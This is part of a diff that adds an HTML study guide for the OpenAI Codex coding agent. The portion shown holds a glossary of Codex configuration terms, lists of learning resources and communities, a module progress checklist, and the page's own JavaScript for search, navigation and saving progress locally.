+<dd class="avoid"><strong>Avoid:</strong> "permission mode", "auto mode" — those blur sandbox and approvals together.</dd>
+<dt>Approval policy</dt>
+<dd>The setting that decides when Codex must pause for your consent: <code>on-request</code>, <code>never</code> or granular.</dd>
+<dd class="avoid"><strong>Avoid:</strong> "full-auto", "untrusted" — removed or unsupported in current releases.</dd>
+<dt>Profile</dt>
+<dd>A named config file at <code>$CODEX_HOME/&lt;name&gt;.config.toml</code> selected with <code>--profile</code>.</dd>
+<dd class="avoid"><strong>Avoid:</strong> "preset", "mode".</dd>
+<dt>Trusted project</dt>
+<dd>A repo marked <code>trust_level = "trusted"</code> in user config, which allows its <code>.codex/config.toml</code> to load.</dd>
+<dd class="avoid"><strong>Avoid:</strong> "allowed directory" — trust governs config loading, not write access.</dd>
+<dt>AGENTS.md</dt>
+<dd>A Markdown file of always-loaded instructions, discovered globally and from the repo root down to the working directory.</dd>
+<dd class="avoid"><strong>Avoid:</strong> "system prompt", "CLAUDE.md" — different mechanisms in different tools.</dd>
+<dt>Reasoning effort</dt>
+<dd>The per-request setting that trades latency and usage for deeper model reasoning.</dd>
+<dd class="avoid"><strong>Avoid:</strong> "temperature", "thinking budget".</dd>
+</dl>
+<h3 id="glossary-extension">Extension &amp; Automation</h3>
+<dl class="glossary">
+<dt>MCP server</dt>
+<dd>An external process or HTTP endpoint that exposes tools to Codex over the Model Context Protocol.</dd>
+<dd class="avoid"><strong>Avoid:</strong> "plugin", "integration" — too vague to say what runs where.</dd>
+<dt>Skill</dt>
+<dd>A folder with a <code>SKILL.md</code> procedure that Codex loads on demand when a task matches its description.</dd>
+<dd class="avoid"><strong>Avoid:</strong> "custom command", "macro".</dd>
+<dt>Rule</dt>
+<dd>A declarative command-prefix policy in a <code>.rules</code> file that allows, prompts for, or forbids shell commands.</dd>
+<dd class="avoid"><strong>Avoid:</strong> "hook" — rules decide; hooks run code.</dd>
+<dt>Hook</dt>
+<dd>A command or MCP tool that Codex runs when a lifecycle event such as <code>PostToolUse</code> or <code>Stop</code> fires.</dd>
+<dd class="avoid"><strong>Avoid:</strong> "callback", "trigger".</dd>
+<dt>codex exec</dt>
+<dd>Codex's non-interactive mode: run one task to completion and exit, read-only by default.</dd>
+<dd class="avoid"><strong>Avoid:</strong> "headless mode", "batch mode".</dd>
+<dt>Output schema</dt>
+<dd>A JSON Schema that constrains Codex's final message to machine-readable JSON.</dd>
+<dd class="avoid"><strong>Avoid:</strong> "JSON mode" — <code>--json</code> streams events, which is a different feature.</dd>
+<dt>Safety strategy</dt>
+<dd>The <code>codex-action</code> input that sets how Codex is isolated on the runner (default <code>drop-sudo</code>).</dd>
+<dd class="avoid"><strong>Avoid:</strong> "sandbox" — the action has its own <code>sandbox</code> input as well.</dd>
+</dl>
+
+<h2 id="resources">Learning Resources &amp; Communities</h2>
+<h3 id="books">Books</h3>
+<table>
+<tr><th>Title</th><th>Focus</th></tr>
+<tr><td><em>Beyond Vibe Coding</em> — Addy Osmani, O'Reilly (2025)</td><td>Disciplined engineering with AI coding agents: specs, review, testing</td></tr>
+<tr><td><em>Vibe Coding</em> — Gene Kim &amp; Steve Yegge, IT Revolution (2025)</td><td>Working practices and organizational patterns for agent-driven development</td></tr>
+<tr><td><em>AI Engineering</em> — Chip Huyen, O'Reilly (2025)</td><td>Evaluation, structured output and failure modes behind agent automation</td></tr>
+<tr><td><em>Effective TypeScript</em>, 2nd ed. — Dan Vanderkam, O'Reilly (2024)</td><td>The TypeScript judgment you need to review DevToolkit diffs well</td></tr>
+<tr><td><em>The Pragmatic Programmer</em>, 20th Anniversary ed. — Thomas &amp; Hunt (2019)</td><td>Version-independent habits: small steps, tests as safety net, automation</td></tr>
+</table>
+<p style="font-size:.85rem;color:var(--ink-soft)">No book covers Codex itself at the current release pace — use the official docs for anything version-specific.</p>
+<h3 id="online-resources">Online Resources</h3>
+<table>
+<tr><th>Resource</th><th>Topic</th><th>Notes</th></tr>
+<tr><td>Codex docs — learn.chatgpt.com/docs (developers.openai.com/codex redirects here)</td><td>Everything</td><td>Primary source; CLI, config reference, non-interactive mode, cloud environments</td></tr>
+<tr><td>Codex changelog — learn.chatgpt.com/docs/changelog</td><td>Releases</td><td>Check before trusting any tutorial older than a month</td></tr>
+<tr><td>Configuration Reference + Sample Configuration</td><td><code>config.toml</code></td><td>Authoritative key names and allowed values</td></tr>
+<tr><td>Codex slash commands page</td><td>CLI</td><td>Full, current command list</td></tr>
+<tr><td>GitHub — openai/codex</td><td>Source, issues, releases</td><td>Open-source CLI; release notes per <code>rust-v*</code> tag</td></tr>
+<tr><td>GitHub — openai/codex-action</td><td>CI</td><td>Inputs, safety strategies, examples</td></tr>
+<tr><td>Codex SDK docs page</td><td><code>@openai/codex-sdk</code></td><td>Thread options, events, resume</td></tr>
+<tr><td>agents.md</td><td>AGENTS.md format</td><td>Open format shared across coding agents</td></tr>
+<tr><td>modelcontextprotocol.io</td><td>MCP</td><td>Protocol spec and server registry</td></tr>
+</table>
+<h3 id="datasets-and-tools">Datasets &amp; Tools</h3>
+<table>
+<tr><th>Item</th><th>Primary Use</th></tr>
+<tr><td><a href="../datasets/devtoolkit/README.md">DevToolkit spec</a></td><td>The benchmark project for every exercise (spec only — you build it)</td></tr>
+<tr><td>Node.js 20+, npm</td><td>DevToolkit runtime; Codex npm install; SDK (Node 18+)</td></tr>
+<tr><td>PostgreSQL + Prisma</td><td>DevToolkit database layer</td></tr>
+<tr><td>Vitest + Supertest</td><td>The test suite Codex runs to verify its own work</td></tr>
+<tr><td>jq</td><td>Reading <code>codex exec</code> JSON output in scripts</td></tr>
+<tr><td>GitHub Actions</td><td>Running <code>openai/codex-action</code></td></tr>
+</table>
+<h3 id="communities">Communities</h3>
+<table>
+<tr><th>Community</th><th>Platform</th><th>Best for</th></tr>
+<tr><td>OpenAI Developer Community — Codex category</td><td>community.openai.com</td><td>Official announcements, staff answers, known issues</td></tr>
+<tr><td>openai/codex Issues &amp; Discussions</td><td>GitHub</td><td>Bug reports, feature requests, reading what breaks between releases</td></tr>
+<tr><td>OpenAI Discord</td><td>Discord</td><td>Quick help and sharing setups</td></tr>
+<tr><td>r/ChatGPTCoding</td><td>Reddit</td><td>Cross-tool comparisons and workflows from practitioners</td></tr>
+<tr><td>r/OpenAI</td><td>Reddit</td><td>Release news and plan/limit discussions</td></tr>
+</table>
+
+<h2 id="progress-tracker">Progress Tracker</h2>
+<blockquote class="module-meta"><p>Check items off as you finish them — this checklist drives the <strong>Module progress</strong> meter in the sidebar. Progress is saved automatically in this browser and persists across reloads — use "Reset progress" in the sidebar to clear it.</p></blockquote>
+<h4>Phase 1 — Foundations</h4>
+<ul>
+<li>[ ] Module 1.1 — What Codex Is</li>
+<li>[ ] Exercise 1.1 — Choose the surface</li>
+<li>[ ] Module 1.2 — Install, Sign In, First Session</li>
+<li>[ ] Exercise 1.2 — Bootstrap DevToolkit</li>
+<li>[ ] Module 1.3 — Prompting and Plan Mode</li>
+<li>[ ] Exercise 1.3 — Users endpoint</li>
+<li>[ ] Module 1.4 — Models and Reasoning Effort</li>
+<li>[ ] Exercise 1.4 — Effort experiment</li>
+<li>[ ] Capstone 1 — Scaffold DevToolkit</li>
+</ul>
+<h4>Phase 2 — Control &amp; Safety</h4>
+<ul>
+<li>[ ] Module 2.1 — Sandbox and Approvals</li>
+<li>[ ] Exercise 2.1 — Lock the workspace</li>
+<li>[ ] Module 2.2 — config.toml and Profiles</li>
+<li>[ ] Exercise 2.2 — Two profiles</li>
+<li>[ ] Module 2.3 — AGENTS.md Project Instructions</li>
+<li>[ ] Exercise 2.3 — Encode the conventions</li>
+<li>[ ] Module 2.4 — Session Control and Review</li>
+<li>[ ] Exercise 2.4 — Review before commit</li>
+<li>[ ] Capstone 2 — Harden the workspace</li>
+</ul>
+<h4>Phase 3 — Extending Codex</h4>
+<ul>
+<li>[ ] Module 3.1 — MCP Servers</li>
+<li>[ ] Exercise 3.1 — Docs and issues</li>
+<li>[ ] Module 3.2 — Skills</li>
+<li>[ ] Exercise 3.2 — Resource generator</li>
+<li>[ ] Module 3.3 — Hooks and Rules</li>
+<li>[ ] Exercise 3.3 — Guardrails</li>
+<li>[ ] Module 3.4 — IDE Extension and Codex Cloud</li>
+<li>[ ] Exercise 3.4 — Delegate and apply</li>
+<li>[ ] Capstone 3 — DevToolkit toolchain</li>
+</ul>
+<h4>Phase 4 — Automation</h4>
+<ul>
+<li>[ ] Module 4.1 — codex exec and Structured Output</li>
+<li>[ ] Exercise 4.1 — Nightly health check</li>
+<li>[ ] Module 4.2 — GitHub Review and CI</li>
+<li>[ ] Exercise 4.2 — Automated review</li>
+<li>[ ] Module 4.3 — The Codex SDK</li>
+<li>[ ] Exercise 4.3 — Triage bot</li>
+<li>[ ] Capstone 4 — Automated PR pipeline</li>
+</ul>
+<h4>Certifications / Outcomes</h4>
+<p style="font-size:.85rem;color:var(--ink-soft)">OpenAI did not offer a Codex certification as of the verification date, so these are portfolio outcomes instead.</p>
+<ul>
+<li>[ ] DevToolkit repo public with AGENTS.md, skills and CI review visible</li>
+<li>[ ] <code>docs/codex-setup.md</code> tested by someone else reproducing your setup</li>
+<li>[ ] Final Capstone — DevToolkit ships with Codex</li>
+</ul>
+
+<p><em>Guide Version 1.0 — OpenAI Codex Track: Beginner to Intermediate</em><br>
+<em>Non-linear modular design · Placement quiz · 15 modules · ~9 weeks part-time · hayah-ai</em><br>
+<em>Tool versions and resources verified as of 2026-11-22 (Codex CLI 0.171.0, GPT-6.2 Sol default). Codex ships weekly — re-check the changelog before relying on version-specific flags.</em></p>
+
+    </article>
+  </main>
+</div>
+
+<button class="totop" id="toTop" aria-label="Back to top">↑</button>
+
+<script>
+(function(){
+  "use strict";
+
+  // ── Tag code blocks with language label ──────────────────
+  document.querySelectorAll("pre > code").forEach(function(code){
+    var cls = code.className || "";
+    var m = cls.match(/language-(\w+)/);
+    var lang = m ? m[1] : "";
+    var map = {py:"python",js:"javascript",sql:"sql",dax:"dax",m:"M / Power Query",
+               excel:"excel",bash:"shell",md:"markdown",markdown:"markdown",
+               python:"python",javascript:"javascript",r:"R",typescript:"typescript",
+               ts:"typescript",css:"css",html:"html",json:"json",yaml:"yaml",
+               toml:"toml",/* EXTEND_LANG_MAP */};
+    if(lang){ code.parentElement.setAttribute("data-lang", map[lang]||lang); }
+  });
+
+  // ── Wrap tables for horizontal scroll ────────────────────
+  document.querySelectorAll(".content table").forEach(function(t){
+    if(t.parentElement.classList.contains("table-scroll")) return;
+    var w=document.createElement("div");w.className="table-scroll";
+    t.parentElement.insertBefore(w,t);w.appendChild(t);
+  });
+
+  // ── Convert markdown task-list "[ ]" text into checkboxes ─
+  // Checkbox + remaining text are wrapped in one <label> so the whole
+  // line is clickable (WCAG 2.5.8 target size), not just the 16px box.
+  document.querySelectorAll(".content li").forEach(function(li){
+    var first = li.childNodes[0];
+    if(first && first.nodeType===3){
+      var t=first.nodeValue;
+      var mm=t.match(/^\s*\[( |x|X)\]\s?/);
+      if(mm){
+        var checked = mm[1].toLowerCase()==="x";
+        first.nodeValue = t.replace(/^\s*\[( |x|X)\]\s?/,"");
+        var cb=document.createElement("input");
+        cb.type="checkbox"; cb.checked=checked; cb.className="task-cb";
+        var label=document.createElement("label");
+        label.className="task-label";
+        while(li.firstChild){ label.appendChild(li.firstChild); }
+        label.insertBefore(cb, label.firstChild);
+        li.appendChild(label);
+      }
+    }
+  });
+
+  // ── Progress tracking (persisted per-guide via localStorage) ──
+  // These are downloaded standalone files opened via file://, not sandboxed
+  // claude.ai artifacts — localStorage works and survives reloads/re-opens.
+  // Namespaced by document.title so multiple guides in the same browser
+  // don't collide (some browsers share a single origin across file:// URLs).
+  var LS_KEY = "lg-progress:" + (document.title || location.pathname);
+  function loadProgress(){
+    try{ return JSON.parse(localStorage.getItem(LS_KEY) || "{}"); }
+    catch(e){ return {}; } // storage disabled/unavailable — degrade to session-only
+  }
+  function saveProgress(map){
+    try{ localStorage.setItem(LS_KEY, JSON.stringify(map)); }catch(e){}
+  }
+
+  // The sidebar meter reflects ONLY the Progress Tracker checklist (real module
+  // completion), not the Placement Quiz self-assessment. Placement-quiz boxes
+  // stay interactive (and persist) but are excluded from the meter count.
+  var allCb = Array.prototype.slice.call(document.querySelectorAll(".task-cb"));
+  allCb.forEach(function(c,i){ c.dataset.lgIdx = i; }); // stable per-guide key
+  var savedMap = loadProgress();
+  allCb.forEach(function(c){
+    if(Object.prototype.hasOwnProperty.call(savedMap, c.dataset.lgIdx)){
+      c.checked = !!savedMap[c.dataset.lgIdx];
+    }
+  });
+
+  var ptHeading = document.getElementById("progress-tracker");
+  var countedCb = ptHeading
+    ? allCb.filter(function(c){
+        return !!(ptHeading.compareDocumentPosition(c) & Node.DOCUMENT_POSITION_FOLLOWING);
+      })
+    : allCb; // fallback: if no tracker section, count everything
+
+  function updateProgress(){
+    var total = countedCb.length;
+    var done = countedCb.filter(function(c){return c.checked}).length;
+    var pct = total? Math.round(done/total*100):0;
+    document.getElementById("progFill").style.width = pct+"%";
+    document.getElementById("progPct").textContent = pct+"%";
+  }
+  allCb.forEach(function(c){
+    c.addEventListener("change",function(){
+      var map = loadProgress();
+      map[c.dataset.lgIdx] = c.checked;
+      saveProgress(map);
+      updateProgress();
+    });
+  });
+  updateProgress();
+
+  document.getElementById("progReset").addEventListener("click",function(){
+    var map = loadProgress();
+    countedCb.forEach(function(c){ c.checked=false; map[c.dataset.lgIdx]=false; });
+    saveProgress(map);
+    updateProgress();
+  });
+
+  // ── Placement Quiz: live score badge per section ──────────
+  // Purely additive DOM scan — no special authoring markup required.
+  // Scans every sibling between #placement-quiz and the next <h2>,
+  // and drops a live "Your score: X / N" badge after each quiz <ul>.
+  var pq = document.getElementById("placement-quiz");
+  if(pq){
+    var sib = pq.nextElementSibling;
+    while(sib && sib.tagName !== "H2"){
+      if(sib.tagName === "UL"){
+        (function(ul){
+          var boxes = Array.prototype.slice.call(ul.querySelectorAll('input[type=checkbox]'));
+          if(!boxes.length) return;
+          var badge = document.createElement("p");
+          badge.className = "quiz-score";
+          ul.insertAdjacentElement("afterend", badge);
+          function refresh(){
+            var done = boxes.filter(function(b){return b.checked}).length;
+            badge.textContent = "Your score: " + done + " / " + boxes.length;
+          }
+          boxes.forEach(function(b){ b.addEventListener("change", refresh); });
+          refresh();
+        })(sib);
+      }
+      sib = sib.nextElementSibling;
+    }
+  }
+
+  // ── Full-text guide search ────────────────────────────────
+  // Indexes every block of the guide body, lists matching snippets grouped
+  // by section, highlights hits in the page, and filters the nav to the
+  // sections that contain them. Multiple words = all must appear in the
+  // same block; wrap in "quotes" for an exact phrase.
+  var navSearch = document.getElementById("navSearch");
+  var contentRoot = document.querySelector(".content");
+  if(navSearch && contentRoot){
+    var BLOCK_SEL = "h1,h2,h3,h4,p,li,tr,dt,dd,pre";
+    var searchRow = document.getElementById("searchRow"),
+        searchBar = document.getElementById("searchBar"),
+        searchCount = document.getElementById("searchCount"),
+        searchResults = document.getElementById("searchResults");
+    var navById = {};
+    document.querySelectorAll("#nav a").forEach(function(a){
+      navById[a.getAttribute("href").slice(1)] = a;
+    });
+
+    var blocks = [], section = null;
+    contentRoot.querySelectorAll(BLOCK_SEL).forEach(function(el){
+      if(/^H[1-4]$/.test(el.tagName) && el.id && navById[el.id]) section = el;
+      if(el.classList.contains("quiz-score")) return;
+      var outer = el.parentElement && el.parentElement.closest(BLOCK_SEL);
+      if(outer && contentRoot.contains(outer)) return;
+      var text = el.textContent.replace(/\s+/g, " ").trim();
+      if(text) blocks.push({el:el, text:text, lower:text.toLowerCase(), section:section});
+    });
+
+    var hits = [], cur = -1, timer = null;
+    function escHtml(s){ return s.replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;"); }
+    function escRe(s){ return s.replace(/[.*+?^${}()|[\]\\]/g, "\\$&"); }
+    function sectionLabel(sec){ return sec && navById[sec.id] ? navById[sec.id].textContent : "Introduction"; }
+
+    function clearMarks(){
+      contentRoot.querySelectorAll("mark.lg-hit").forEach(function(m){
+        var p = m.parentNode;
+        p.replaceChild(document.createTextNode(m.textContent), m);
+        p.normalize();
+      });
+      var b = contentRoot.querySelector(".lg-block-current");
+      if(b) b.classList.remove("lg-block-current");
+    }
+
+    function markBlock(el, re){
+      var walker = document.createTreeWalker(el, NodeFilter.SHOW_TEXT, null), nodes = [], n;
+      while((n = walker.nextNode())) nodes.push(n);
+      var marks = [];
+      nodes.forEach(function(node){
+        var t = node.nodeValue, m, last = 0;
+        re.lastIndex = 0;
+        if(!re.test(t)) return;
+        re.lastIndex = 0;
+        var frag = document.createDocumentFragment();
+        while((m = re.exec(t))){
+          if(m.index > last) frag.appendChild(document.createTextNode(t.slice(last, m.index)));
+          var mk = document.createElement("mark");
+          mk.className = "lg-hit";
+          mk.textContent = m[0];
+          frag.appendChild(mk);
+          marks.push(mk);
+          last = m.index + m[0].length;
+        }
+        if(last < t.length) frag.appendChild(document.createTextNode(t.slice(last)));
+        node.parentNode.replaceChild(frag, node);
+      });
+      return marks;
+    }
+
+    function snippet(text, terms, re){
+      var lower = text.toLowerCase(), i = -1;
+      terms.forEach(function(t){ var k = lower.indexOf(t); if(k > -1 && (i < 0 || k < i)) i = k; });
+      if(i < 0) i = 0;
+      var start = Math.max(0, i - 40), end = Math.min(text.length, i + 100);
+      var s = text.slice(start, end), out = "", last = 0, m;
+      re.lastIndex = 0;
+      while((m = re.exec(s))){
+        out += escHtml(s.slice(last, m.index)) + "<mark>" + escHtml(m[0]) + "</mark>";
+        last = m.index + m[0].length;
+      }
+      return (start > 0 ? "…" : "") + out + escHtml(s.slice(last)) + (end < text.length ? "…" : "");
+    }
+
+    function filterNav(ids){
+      document.querySelectorAll(".nav-group").forEach(function(g){
+        var any = false;
+        g.querySelectorAll("a").forEach(function(a){
+          var show = !ids || !!ids[a.getAttribute("href").slice(1)];
+          if(a.classList.contains("nav-child")) a.classList.toggle("filtered-out", !show);
+          if(show) any = true;
+        });
+        g.classList.toggle("filtered-out", !any);
+      });
+      document.querySelectorAll("#nav > a.nav-top").forEach(function(a){
+        a.classList.toggle("filtered-out", !!ids && !ids[a.getAttribute("href").slice(1)]);
+      });
+    }
+
+    function updateCount(nSections){
+      if(!hits.length){ searchCount.textContent = "No matches"; return; }
+      var pos = cur > -1 ? (cur + 1) + " / " + hits.length : hits.length + (hits.length === 1 ? " match" : " matches");
+      searchCount.textContent = pos + " · " + nSections + (nSections === 1 ? " section" : " sections");
+    }
+
+    var lastSectionCount = 0;
+    function run(){
+      var raw = navSearch.value.trim();
+      clearMarks();
+      hits = []; cur = -1;
+      searchRow.classList.toggle("has-query", !!raw);
+      if(raw.length < 2){
+        searchResults.classList.remove("show");
+        searchBar.classList.remove("show");
+        searchResults.innerHTML = "";
+        filterNav(null);
+        return;
+      }
+      var phrase = /^"(.+)"$/.exec(raw);
+      var terms = phrase ? [phrase[1].toLowerCase()] : raw.toLowerCase().split(/\s+/);
+      terms = terms.filter(function(t, i){ return t && terms.indexOf(t) === i; });
+      var re = new RegExp(terms.slice().sort(function(a, b){ return b.length - a.length; }).map(escRe).join("|"), "gi");
+      var matched = blocks.filter(function(b){
+        return terms.every(function(t){ return b.lower.indexOf(t) > -1; });
+      });
+
+      var ids = {}, groups = [], html = "", LIMIT = 60;
+      matched.forEach(function(b, bi){
+        var marks = markBlock(b.el, re);
+        if(marks.length) marks.forEach(function(m){ hits.push({m:m, el:b.el, b:bi}); });
+        else hits.push({m:null, el:b.el, b:bi});
+        var key = b.section ? b.section.id : "";
+        if(b.section) ids[b.section.id] = true;
+        if(!groups.length || groups[groups.length - 1].key !== key) groups.push({key:key, sec:b.section, items:[]});
+        groups[groups.length - 1].items.push(bi);
+      });
+
+      if(!matched.length){
+        html = '<div class="sr-empty">No matches for “' + escHtml(raw) + '”. Try fewer words.</div>';
+      } else {
+        var listed = 0;
+        groups.forEach(function(g){
+          if(listed >= LIMIT) return;
+          html += '<div class="sr-group"><div class="sr-section">' + escHtml(sectionLabel(g.sec)) + '</div>';
+          g.items.slice(0, 4).forEach(function(bi){
+            if(listed >= LIMIT) return;
+            html += '<button type="button" class="sr-item" role="option" data-b="' + bi + '">' +
+                    snippet(matched[bi].text, terms, re) + '</button>';
+            listed++;
+          });
+          if(g.items.length > 4) html += '<div class="sr-more">+' + (g.items.length - 4) + ' more in this section (use ↓ to step through)</div>';
+          html += '</div>';
+        });
+        if(matched.length > listed) html += '<div class="sr-more">Showing ' + listed + ' of ' + matched.length + ' blocks — add a word to narrow it.</div>';
+      }
+      searchResults.innerHTML = html;
+      searchResults.classList.add("show");
+      searchBar.classList.add("show");
+      lastSectionCount = Object.keys(ids).length || (matched.length ? 1 : 0);
+      filterNav(ids);
+      updateCount(lastSectionCount);
+    }
+
+    function go(i, closeMobile){
+      if(!hits.length) return;
+      cur = (i + hits.length) % hits.length;
+      contentRoot.querySelectorAll("mark.lg-hit-current").forEach(function(m){ m.classList.remove("lg-hit-current"); });
+      var prev = contentRoot.querySelector(".lg-block-current");
+      if(prev) prev.classList.remove("lg-block-current");
+      var h = hits[cur];
+      if(h.m) h.m.classList.add("lg-hit-current");
+      h.el.classList.add("lg-block-current");
+      (h.m || h.el).scrollIntoView({behavior:"smooth", block:"center"});
+      searchResults.querySelectorAll(".sr-item").forEach(function(it){
+        var on = +it.getAttribute("data-b") === h.b;
+        it.classList.toggle("current", on);
+        if(on) it.scrollIntoView({block:"nearest"});
+      });
+      updateCount(lastSectionCount);
+      if(closeMobile && window.innerWidth <= 1000) closeNav();
+    }
+
+    navSearch.addEventListener("input", function(){
+      clearTimeout(timer);
+      timer = setTimeout(run, 140);
+    });
+    navSearch.addEventListener("keydown", function(e){
+      if(e.key === "Enter"){
+        e.preventDefault();
+        clearTimeout(timer);
+        if(!hits.length && navSearch.value.trim().length >= 2) run();
+        go(e.shiftKey ? cur - 1 : cur + 1, true);
+      } else if(e.key === "Escape"){
+        navSearch.value = "";
+        run();
+      }
+    });
+    searchResults.addEventListener("click", function(e){
+      var item = e.target.closest(".sr-item");
+      if(!item) return;
+      var b = +item.getAttribute("data-b");
+      for(var k = 0; k < hits.length; k++){ if(hits[k].b === b){ go(k, true); break; } }
+    });
+    document.getElementById("searchNext").addEventListener("click", function(){ go(cur + 1, false); });
+    document.getElementById("searchPrev").addEventListener("click", function(){ go(cur - 1, false); });
+    document.getElementById("searchClear").addEventListener("click", function(){
+      navSearch.value = "";
+      run();
+      navSearch.focus();
+    });
+    document.addEventListener("keydown", function(e){
+      var tag = (e.target.tagName || "").toLowerCase();
+      var typing = tag === "input" || tag === "textarea" || e.target.isContentEditable;
+      var slash = e.key === "/" && !typing && !e.ctrlKey && !e.metaKey && !e.altKey;
+      var cmdK = (e.ctrlKey || e.metaKey) && (e.key === "k" || e.key === "K");
+      if(!slash && !cmdK) return;
+      e.preventDefault();
+      if(window.innerWidth <= 1000){
+        document.getElementById("sidebar").classList.add("open");
+        document.getElementById("scrim").classList.add("show");
+      }
+      navSearch.focus();
+      navSearch.select();
+    });
+  }
+
+  // ── Scrollspy: highlight active nav item ─────────────────
+  var navLinks = Array.prototype.slice.call(document.querySelectorAll("#nav a"));
+  var linkById = {};
+  navLinks.forEach(function(a){
+    var id=a.getAttribute("href").slice(1); linkById[id]=a;
+  });
+  var targets = navLinks.map(function(a){
+    return document.getElementById(a.getAttribute("href").slice(1));
+  }).filter(Boolean);
+
+  var spy = new IntersectionObserver(function(entries){
+    entries.forEach(function(e){
+      if(e.isIntersecting){
+        navLinks.forEach(function(a){a.classList.remove("active")});
+        var id=e.target.id;
+        if(linkById[id]) linkById[id].classList.add("active");
+      }
+    });
+  },{rootMargin:"-10% 0px -80% 0px",threshold:0});
+  targets.forEach(function(t){spy.observe(t)});
+
+  // ── Mobile nav ───────────────────────────────────────────
+  var sb=document.getElementById("sidebar"),
+      scrim=document.getElementById("scrim"),
+      mb=document.getElementById("menuBtn");
+  function closeNav(){sb.classList.remove("open");scrim.classList.remove("show")}
+  mb.addEventListener("click",function(){
+    sb.classList.toggle("open");scrim.classList.toggle("show");
+  });
+  scrim.addEventListener("click",closeNav);
+  document.querySelectorAll("#nav a").forEach(function(a){
+    a.addEventListener("click",function(){ if(window.innerWidth<=1000) closeNav(); });
+  });
+
+  // ── Interactive module index (click a row to jump) ───────
+  document.querySelectorAll(".module-index-table tr[data-href]").forEach(function(row){
+    row.addEventListener("click",function(){
+      var id=this.getAttribute("data-href").slice(1);
+      var target=document.getElementById(id);
+      if(target){target.scrollIntoView({behavior:"smooth",block:"start"});}
+    });
+  });
+
+  // ── Back to top ──────────────────────────────────────────
+  var tt=document.getElementById("toTop");
+  window.addEventListener("scroll",function(){
+    if(window.scrollY>600) tt.classList.add("show"); else tt.classList.remove("show");
+  },{passive:true});
+  tt.addEventListener("click",function(){window.scrollTo({top:0,behavior:"smooth"})});
+})();
+</script>
+</body>
+</html>
